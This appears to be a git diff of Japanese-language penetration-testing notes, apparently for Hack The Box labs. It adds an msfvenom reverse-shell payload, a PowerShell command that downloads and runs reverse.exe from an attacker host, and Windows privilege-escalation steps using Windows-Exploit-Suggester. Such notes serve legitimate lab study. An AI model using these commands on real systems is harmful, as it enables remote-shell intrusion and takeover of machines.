@@ -262,8 +262,30 @@ better shell をとるのに使った　[リンク](https://codemonkeyism.co.uk/
 
 
 #### Windows(netcatなど)
+
+
+msfvenom で payload 作成
+
 ```
+
 msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
+
+````
+
+powershell で download
+
+```
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.27.249:8000/reverse.exe','reverse.exe')"
+
+
+```
+
+metasploit で multi/handler を待ち構えて、ダウンロードしたファイルを実行
+
+```
+powershell "Start-Process "reverse.exe"
+
 ```
 
 #### Linux
@@ -288,7 +310,7 @@ run
 ```
 
 
-# 特権エスカレーション
+# 特権エスカレーション基本戦略 [Linux]
 
 とっかかりは、ps aux で良さそう。
 ps -auxww | grep vnc　とかで、細かく情報見る。
@@ -318,6 +340,36 @@ find / -perm -u=s -type f 2>/dev/null
 
 ・var/log/syslog 見て、ある特定のファイルが定期実行されているなどの手がかりを見にいく。
 
+# 特権エスカレーション基本戦略 (Windows)
+
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+systeminfo で、OS name, OS version をcheck.
+
+hotfix で、update がされているか確認。
+
+```
+ex: 
+
+OS Name:                Microsoft Windows Server 2008 R2 Datacenter 
+OS Version:             6.1.7600 N/A Build 7600
+HotFix:                 N/A
+
+```
+
+
+[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) を使う
+
+```
+
+./windows-exploit-suggester.py --update
+
+systeminfo の内容をコピーし、systeminfo.txt をつくる
+その後、以下のようなコマンドをうつ
+
+./windows-exploit-suggester.py --database 2019-10-12-mssb.xls --systeminfo /root/Desktop/htb/arctic/systeminfo.txt
+
+```
 
 
 ## metasploit(local_exploit_suggester)
